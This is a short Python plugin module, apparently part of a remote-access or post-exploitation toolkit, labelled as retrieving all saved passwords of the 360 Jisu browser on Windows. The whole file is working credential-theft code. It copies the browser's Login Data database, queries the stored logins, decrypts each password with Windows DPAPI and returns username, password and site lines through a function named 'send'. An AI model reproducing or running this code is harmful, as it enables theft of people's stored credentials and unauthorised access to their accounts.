__sys__ = ["Windows"]
__name__ = "jisuPassword"
__desc__ = "Retrieve all saved password of 360 Jisu Browser (360极速浏览器)"


def send():
    import os, sqlite3, win32crypt, shutil
    sourceFileWithLogin = "%s\\360Chrome\\Chrome\\User Data\\Profile 1\\Login Data" % os.getenv("localappdata")
    sourceFileWithoutLogin = "%s\\360Chrome\\Chrome\\User Data\\Default\\Login Data" % os.getenv("localappdata")

    def get(sourceFile):
        targetFile = "%s\\TempData_360" % os.getenv("localappdata")
        result = "<Username>:<Password> (Site)\n"
        shutil.copy(sourceFile, targetFile)
        connection = sqlite3.connect(targetFile)
        with connection:
            cursor = connection.cursor()
            vGen = cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            dataValue = vGen.fetchall()
        for originURL, username, password in dataValue:
            passwordDecrypted = str(win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1])
            if passwordDecrypted:
                result += "%s:%s (%s)\n" % (username, passwordDecrypted, originURL)
        connection.close()
        os.remove(targetFile)
        return result

    if os.path.exists(sourceFileWithoutLogin) and \
            len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0 and \
            os.path.exists(sourceFileWithLogin):
        return get(sourceFileWithLogin)
    else:
        if os.path.exists(sourceFileWithoutLogin) and \
                not len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0:
            return get(sourceFileWithoutLogin)
        else:
            pass
